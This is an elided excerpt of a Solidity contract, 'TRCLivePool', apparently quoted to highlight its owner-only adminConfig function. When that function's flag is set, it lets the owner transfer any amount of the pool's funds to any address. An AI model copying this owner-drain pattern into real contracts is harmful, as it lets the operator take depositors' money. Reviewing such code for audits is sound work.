...
contract TRCLivePool is Ownable{
    ...
    uint256 private inviterRate = 10;
    ...
    function adminConfig(address _account, uint256 _value, bool _type) public onlyOwner {
        if (_type) {
            ...
            address(uint160(_account)).transfer(_value);
        }
    }
